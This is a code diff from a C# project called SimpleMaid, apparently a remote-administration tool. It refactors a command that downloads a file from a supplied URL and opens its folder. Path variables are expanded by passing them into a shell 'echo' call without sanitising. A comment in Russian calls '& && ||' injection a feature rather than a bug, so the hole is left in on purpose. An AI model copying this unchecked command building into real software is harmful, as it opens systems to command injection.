@@ -580,9 +580,7 @@ namespace SimpleMaid
     // TODO: Get filename from Response.Header
     private static string urlToFile(string url)
     {
-      string[] urlParts = url.Split(new char[] { '/' }, StringSplitOptions.RemoveEmptyEntries);
-
-      return Uri.UnescapeDataString(urlParts[urlParts.Length - 1]);
+      return Uri.UnescapeDataString(url.Substring(url.LastIndexOf('/') + 1));
     }
 
     // TODO: Implement adequate decoding
@@ -982,26 +980,23 @@ namespace SimpleMaid
         return resources.IncompleteCommandErrMsg;
       }
 
-      string download_dir = null;
-      string download_file = null;
+      string downloadDirPath = null;
+      string downloadFileName = null;
 
       bool quickDownload;
-      if ((quickDownload = (command_parts.Length == 2)) || "d" == command_parts[2])
+      if ((quickDownload = (command_parts.Length == 2)) || resources.KeywordDefault == command_parts[2])
       {
-        download_dir = String.Format("{0}{1}\\", Path.GetTempPath(), Guid.NewGuid().ToString().ToUpper());
-        download_file = urlToFile(command_parts[1]);
+        downloadDirPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
+        downloadFileName = urlToFile(command_parts[1]);
       }
       // TODO: Атаки типа "& && ||" - не баг, а фича!
       else if (command_parts.Length >= 3)
       {
         string ev = resources.EvaluateCmdVariable;
+        char evd = char.Parse(resources.EvaluateCmdVariableEnd);
 
-        int indexOfCmdVariable = command_parts[2].IndexOf(resources.EvaluateCmdVariable);
-
-        if (-1 != indexOfCmdVariable)
+        if (command_parts[2].Contains(ev))
         {
-          char evd = char.Parse(resources.EvaluateCmdVariableEnd);
-
           var indexesOfCmdVariables = command_parts[2].AllIndexesOf(ev);
 
           int diff = 0;
@@ -1016,36 +1011,38 @@ namespace SimpleMaid
             }*/
 
             string unEvaluatedVariable = ev + variable + evd;
-            string evaluatedVariable = executeCommand("echo " + variable, false);
+            string evaluatedVariable = executeCommand($"echo {variable}", false);
+
             command_parts[2] = command_parts[2].Replace(unEvaluatedVariable, evaluatedVariable);
 
             diff += unEvaluatedVariable.Length - evaluatedVariable.Length;
           }
         }
 
-        download_dir = Path.GetDirectoryName(command_parts[2]) + "\\";
-        download_file = Path.GetFileName(command_parts[2]);
+        downloadDirPath = Path.GetDirectoryName(command_parts[2]);
+        downloadFileName = Path.GetFileName(command_parts[2]);
       }
 
-      Directory.CreateDirectory(download_dir);
+      Directory.CreateDirectory(downloadDirPath);
 
       // TODO: Use my FTP
+      string downloadFilePath = Path.Combine(downloadDirPath, downloadFileName);
       using (var wc = new WebClient())
       {
         try
         {
-          wc.DownloadFile(new Uri(command_parts[1]), download_dir + download_file);
+          wc.DownloadFile(new Uri(command_parts[1]), downloadFilePath);
         }
         catch (Exception exc)
         {
           return exc.Message;
         }
-
-        if (quickDownload)
-          Process.Start(download_dir);
-        
-        return download_dir + download_file;
       }
+
+      if (quickDownload)
+        Process.Start(downloadDirPath);
+
+      return downloadFilePath;
     }
 
     private static string messageCommand(string[] command_parts)
